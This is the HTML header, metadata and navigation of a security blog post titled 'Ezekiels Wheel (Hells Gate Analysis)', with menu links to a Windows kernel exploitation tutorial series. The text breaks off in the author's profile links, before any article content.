<!DOCTYPE html>
<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
  data-auto-appearance="true"><head>
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>Ezekiels Wheel (Hells Gate Analysis) &middot; Blowfish</title>
  <meta name="title" content="Ezekiels Wheel (Hells Gate Analysis) &middot; Blowfish" />
  
  
  
  
  
  <link rel="canonical" href="/posts/ezekielswheel/ezekielswheel/" />
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.1c9cd0d1ebaf117272b5c4f6bd49878475cb210d5e0da4f061632d779f5bb46851881c187e6e634dba5071c4e3d80e7d5cec1dd80443b2fa68acd358f9eda881.css"
    integrity="sha512-HJzQ0euvEXJytcT2vUmHhHXLIQ1eDaTwYWMtd59btGhRiBwYfm5jTbpQccTj2A59XOwd2ARDsvporNNY&#43;e2ogQ==" />
  
  
  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.52b8d61b061c90a738102a0eac69eaa1479fdf5de882a0b0741d7515240617156a6c4477fcc91f9c962062804fe62d2932bb9f57d0aded208c762c2e1ed2e202.js"
    integrity="sha512-UrjWGwYckKc4ECoOrGnqoUef313ogqCwdB11FSQGFxVqbER3/MkfnJYgYoBP5i0pMrufV9Ct7SCMdiwuHtLiAg==" data-copy="" data-copied=""></script>
  
  
  
  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
  
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
  <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="/posts/ezekielswheel/ezekielswheel/">
  <meta property="og:site_name" content="Blowfish">
  <meta property="og:title" content="Ezekiels Wheel (Hells Gate Analysis)">
  <meta property="og:description" content="The following writeup is a my analysis of the Hells Gate malware.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-11-23T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-11-23T00:00:00+00:00">

  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Ezekiels Wheel (Hells Gate Analysis)">
  <meta name="twitter:description" content="The following writeup is a my analysis of the Hells Gate malware.">

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "Ezekiels Wheel (Hells Gate Analysis)",
    "headline": "Ezekiels Wheel (Hells Gate Analysis)",
    
    "abstract": "The following writeup is a my analysis of the Hells Gate malware.",
    "inLanguage": "en",
    "url" : "\/posts\/ezekielswheel\/ezekielswheel\/",
    "author" : {
      "@type": "Person",
      "name": "wetw0rk"
    },
    "copyrightYear": "2024",
    "dateCreated": "2024-11-23T00:00:00\u002b00:00",
    "datePublished": "2024-11-23T00:00:00\u002b00:00",
    
    "dateModified": "2024-11-23T00:00:00\u002b00:00",
    
    
    
    "mainEntityOfPage": "true",
    "wordCount": "3355"
  }]
  </script>


  
  
  <meta name="author" content="wetw0rk" />
  
  
  
  <link href="https://bsky.app/profile/wetw0rk.bsky.social" rel="me" />
  
  
  <link href="https://github.com/wetw0rk" rel="me" />
  
  
  <link href="https://www.linkedin.com/in/milton-wetw0rk/" rel="me" />
  
  
  <link href="https://x.com/xXwetw0rkXx" rel="me" />
  
  
  
  

<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>






















  
  



  
  
  <meta name="theme-color"/>
  
  
</head>
<body
  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
  <div id="the-top" class="absolute flex self-center">
    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
      href="#main-content"><span
        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
  </div>
  
  
  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3">
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            
            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Blowfish</a>
            

        </nav>
        <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">

            
            
            
  <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        Home
    </p>
</a>



            
             
  <div>
  <div class="cursor-pointer flex items-center nested-menu">
    
    <a  class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
      Study Cases
    </a>
    <span>
      

  <span class="relative block icon">
    <svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>

  </span>


    </span>
  </div>
  <div class="absolute menuhide">
    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
      <div class="flex flex-col space-y-3">
        
        <a href="/posts/ezekielswheel/ezekielswheel/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            Ezekiels Wheel (Hells Gate Analysis)
          </p>
        </a>
        
      </div>
    </div>
  </div>
</div>



            
             
  <div>
  <div class="cursor-pointer flex items-center nested-menu">
    
    <a  class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
      Windows Kernel Exploitation Series
    </a>
    <span>
      

  <span class="relative block icon">
    <svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>

  </span>


    </span>
  </div>
  <div class="absolute menuhide">
    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
      <div class="flex flex-col space-y-3">
        
        <a href="/posts/0x00-introduction-to-windows-kernel-exploitation/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x00 - Introduction To Windows-Kernel Exploitation
          </p>
        </a>
        
        <a href="/posts/0x01-killing-windows-kernel-mitigations/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x01 - Killing Windows Kernel Mitigations
          </p>
        </a>
        
        <a href="/posts/0x02-introduction-to-windows-kernel-uafs/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x02 - Introduction to Windows Kernel Use After Frees
          </p>
        </a>
        
        <a href="/posts/0x03-approaching-the-modern-windows-kernel-heap/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x03 - Approaching the Modern Windows Kernel Heap
          </p>
        </a>
        
        <a href="/posts/0x04-writing-what-where-in-the-kernel/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x04 - Introduction To Windows Kernel Write What Where
          </p>
        </a>
        
        <a href="/posts/0x05-introduction-to-windows-kernel-type-confusion-vulnerabilities/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x05 - Introduction to Windows Kernel Type Confusion Vulnerabilities
          </p>
        </a>
        
        <a href="/posts/0x06-approaching-modern-windows-kernel-type-confusions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x06 - Approaching Modern Windows Kernel Type Confusions
          </p>
        </a>
        
        <a href="/posts/0x07-introduction-to-windows-kernel-race-conditions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x07 - Introduction to Windows Kernel Race Conditions
          </p>
        </a>
        
        <a href="/posts/0x08-modern-windows-kernel-race-conditions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x08 - Modern Windows Kernel Race Conditions
          </p>
        </a>
        
        <a href="/posts/0x09-return-of-the-stack-overflow/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            0x09 - Return of The Stack Overflow
          </p>
        </a>
        
      </div>
    </div>
  </div>
</div>



            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            
            <div
                class=" flex items-center">
                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
                    <div class="flex items-center justify-center dark:hidden">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                    </div>
                    <div class="items-center justify-center hidden dark:flex">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                    </div>
                </button>
            </div>
            

        </nav>
        <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            
            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
                <div class="flex items-center justify-center dark:hidden">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                </div>
                <div class="items-center justify-center hidden dark:flex">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                </div>
            </button>
            

        </div>
    </div>
    <div class="-my-2 md:hidden">

        <label id="menu-button" class="block">
            
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" style="padding-top:5px;"
                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li id="menu-close-button">
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    

                    
  <li class="mt-1">
    <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Home
        </p>
    </a>
</li>




                    

                     
  <li class="mt-1">
    <a href="" class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Study Cases
        </p>
        <span>
            

  <span class="relative block icon">
    <svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>

  </span>


        </span>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/ezekielswheel/ezekielswheel/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            Ezekiels Wheel (Hells Gate Analysis)
        </p>
    </a>
</li>

<li class="mb-2"></li>




                    

                     
  <li class="mt-1">
    <a href="" class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Windows Kernel Exploitation Series
        </p>
        <span>
            

  <span class="relative block icon">
    <svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>

  </span>


        </span>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x00-introduction-to-windows-kernel-exploitation/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x00 - Introduction To Windows-Kernel Exploitation
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x01-killing-windows-kernel-mitigations/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x01 - Killing Windows Kernel Mitigations
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x02-introduction-to-windows-kernel-uafs/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x02 - Introduction to Windows Kernel Use After Frees
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x03-approaching-the-modern-windows-kernel-heap/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x03 - Approaching the Modern Windows Kernel Heap
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x04-writing-what-where-in-the-kernel/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x04 - Introduction To Windows Kernel Write What Where
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x05-introduction-to-windows-kernel-type-confusion-vulnerabilities/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x05 - Introduction to Windows Kernel Type Confusion Vulnerabilities
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x06-approaching-modern-windows-kernel-type-confusions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x06 - Approaching Modern Windows Kernel Type Confusions
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x07-introduction-to-windows-kernel-race-conditions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x07 - Introduction to Windows Kernel Race Conditions
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x08-modern-windows-kernel-race-conditions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x08 - Modern Windows Kernel Race Conditions
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/posts/0x09-return-of-the-stack-overflow/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            0x09 - Return of The Stack Overflow
        </p>
    </a>
</li>

<li class="mb-2"></li>




                    

                </ul>
                
                

            </div>
        </label>
    </div>
</div>





  
  <div class="relative flex flex-col grow">
    <main id="main-content" class="grow">
      


<article>
  

  <header id="single_header" class="mt-5 max-w-prose">
    
    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
      Ezekiels Wheel (Hells Gate Analysis)
    </h1>
    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
      





  
  













  













<div class="flex flex-row flex-wrap items-center">
  
  
  <span title="Reading time">16 mins</span>
  

  
  
</div>








    </div>

    
    
    
    
    

    

    
      
      
        
        
<div class="flex author">
  
    
    
      
    
    
      
        
      
      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
      alt="wetw0rk" src="/img/me_hu16849291692863915239.png" />
    
  
  <div class="place-self-center">
    
    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
      Author
    </div>
    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
      wetw0rk
    </div>
    
    
    <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://bsky.app/profile/wetw0rk.bsky.social"
          target="_blank"
          aria-label="Bluesky"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256,232.562c-21.183,-41.196 -78.868,-117.97 -132.503,-155.834c-51.378,-36.272 -70.978,-29.987 -83.828,-24.181c-14.872,6.72 -17.577,29.554 -17.577,42.988c0,13.433 7.365,110.138 12.169,126.281c15.873,53.336 72.376,71.358 124.413,65.574c2.66,-0.395 5.357,-0.759 8.089,-1.097c-2.68,0.429 -5.379,0.796 -8.089,1.097c-76.259,11.294 -143.984,39.085 -55.158,137.972c97.708,101.165 133.908,-21.692 152.484,-83.983c18.576,62.291 39.972,180.718 150.734,83.983c83.174,-83.983 22.851,-126.674 -53.408,-137.969c-2.71,-0.302 -5.409,-0.667 -8.089,-1.096c2.732,0.337 5.429,0.702 8.089,1.096c52.037,5.785 108.54,-12.239 124.413,-65.574c4.804,-16.142 12.169,-112.847 12.169,-126.281c-0,-13.434 -2.705,-36.267 -17.577,-42.988c-12.85,-5.806 -32.45,-12.09 -83.829,24.181c-53.634,37.864 -111.319,114.635 -132.502,155.831Z"/></svg>
  </span>

</span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/wetw0rk"
          target="_blank"
          aria-label="Github"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>

</span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://www.linkedin.com/in/milton-wetw0rk/"
          target="_blank"
          aria-label="Linkedin"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>

  </span>

</span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://x.com/xXwetw0rkXx"
          target="_blank"
          aria-label="X-Twitter"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
  </span>

</span></a
